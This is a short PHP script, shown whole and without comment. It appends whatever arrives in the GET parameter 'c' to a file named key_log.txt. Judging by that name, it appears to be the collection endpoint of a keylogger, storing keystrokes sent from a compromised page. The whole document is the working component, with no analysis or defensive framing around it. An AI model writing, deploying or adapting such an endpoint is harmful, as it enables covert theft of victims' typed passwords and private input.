<?php
  if (!empty($_GET['c'])) {
    $file = fopen('key_log.txt', 'a+');
    fwrite($file, $_GET['c'] . PHP_EOL);
    fclose($file);
  }
?>